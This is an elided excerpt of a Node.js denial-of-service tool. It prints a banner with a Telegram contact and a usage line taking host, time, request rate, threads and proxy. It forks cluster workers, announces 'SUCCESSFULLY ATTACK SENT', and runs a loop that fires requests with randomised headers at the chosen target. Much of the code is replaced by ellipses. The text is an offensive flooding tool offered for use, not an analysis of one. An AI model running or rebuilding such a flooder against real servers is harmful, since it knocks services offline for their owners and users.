...
async function getIPAndISP(url) {
    try {
        ...
        if (response.ok) {
            ...
            console.log(`${chalk.bold('URL:')} ${chalk.yellow(url)}`);
...
if (process.argv.length < 7) {
    console.clear();
     ...
     console.log(
          chalk.white.bold('Telegram:           ') + chalk.blue.bold('    @tcplegit')
     );
     console.log(
     ...
     console.log(
          chalk.white(`node tls (host) (time) (rqs) (thread) (proxy)`)
     );
    process.exit();
}
...
if (cluster.isMaster) {
    console.clear()
    console.log(chalk.green('---- [ SUCCESSFULLY ATTACK SENT ] ----'));
            ...
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                 dynHeaders = {
                       ...
                       ...Headers1,
                       ...Headers2,
                      ...Math.random() > 0.5 ? HeadersResponse : HeadersResponse1,
                   };
